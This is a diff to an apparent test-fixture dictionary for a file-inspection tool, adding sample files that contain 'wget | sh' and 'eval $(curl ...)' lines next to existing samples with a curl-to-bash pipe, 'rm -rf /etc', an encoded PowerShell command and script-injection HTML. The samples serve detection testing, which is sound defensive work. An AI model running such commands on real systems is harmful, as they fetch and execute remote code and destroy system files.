@@ -41,6 +41,8 @@ INSPECT_CASES = {
     "install.sh": b"#!/bin/sh\ncurl -fsSL https://example.invalid/i.sh | bash\nrm -rf /etc\n",
     "run.ps1": b"powershell.exe -enc SQBFAFgA\n",
     "notes.txt": b"plain ascii notes\nline two\n",
+    "steps.txt": b"then run: wget -qO- https://example.invalid/x | sh\n",
+    "install": b"#!/bin/sh\neval $(curl -s https://example.invalid/env)\n",
     "readme.md": "café — résumé notes\n".encode("utf-8"),
     "page.html": b"<!DOCTYPE html><html><script>alert(1)</script><a href='javascript:x()'>x</a></html>",
     "icon.svg": b"<?xml version='1.0'?><svg><script>1</script></svg>",
